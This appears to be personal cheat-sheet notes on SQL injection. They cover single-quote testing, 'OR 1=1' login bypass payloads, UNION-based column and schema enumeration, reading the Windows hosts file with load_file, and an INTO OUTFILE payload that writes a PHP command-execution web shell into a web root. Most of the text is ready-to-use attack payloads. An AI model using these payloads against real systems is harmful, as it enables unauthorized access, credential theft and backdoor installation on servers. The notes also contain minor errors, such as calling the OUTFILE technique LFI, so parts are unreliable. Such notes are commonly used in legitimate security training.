SQL General Syntax Reference:
SELECT * FROM <table>;
This will show you things from a table.
You can also specify properties.
Specify an item with WHERE:

SELECT username FROM users where id=1;

VULN ENUMERATION:
SQL injections can appear anywhere database interaction occurs on a webapp.
Using a single quote ' is a good way to test for SQL injection vuln
	if the webapp doesn't handle a single quote, it's a probable.
String concatenation without sanitization is another good way to id vulns.

AUTH BYPASS:
f we do encounter errors when our payload is returning multiple rows, we can instruct the query to return a fixed number of records with the LIMIT statement:
select * from users where name = 'tom' or 1=1 LIMIT 1;#

' OR 1=1-- -; is a classic.


DB ENUM:
Passing <index> order by <num> to the db will only throw an error
	if you go over the number of columns. This can tell you 
	how many cols are in db.
Using a UNION command will help us see what columns we are able to view from the 
	site output. <url>?<param>=<val> union all select 1,2,3,4,5 
	will attempt to show the 5 columns in the database. 
After passing a successful union command you can build upon it by specifying params
	instead of numbers:
	UNION ALL SELECT 1,2,user() 
	will show 1,2 and the db user. You can further expand this by including 
	params and tables:
	union all select user,id,password,flag,time from users
	This will display the associated fields with from the users table.
Knowing the schema (GraphQL shoutout) will give you grandular control over queries:
	union all select 1,2 column_name from information_schema.columns where table_name = 'users'
	This will show the column names from the users table. 


CODE EXECUTION:
SQL injections can also execute code using functions like load_file.
union all select 1,2,load_file('C:\Windows\System32\drivers\etc\hosts') 

You can also do LFI attacks with the into OUTFILE command:
union all select 1,2,"<?php echo shell_exec($_GET['cmd']);?>" into outfile 'c:\xampp\htdocs\backdoor.php

This will put a backdoor webshell on a windows webserver.
